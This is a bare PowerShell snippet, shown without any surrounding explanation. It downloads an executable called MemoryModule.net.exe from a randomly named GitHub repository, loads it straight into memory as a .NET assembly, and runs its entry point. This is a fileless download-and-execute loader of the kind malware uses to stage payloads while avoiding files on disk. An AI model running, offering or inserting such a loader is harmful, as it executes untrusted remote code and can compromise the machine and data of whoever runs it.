$bytes = (New-Object System.Net.WebClient).DownloadData(
    "https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe"
)

$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, $null)
 
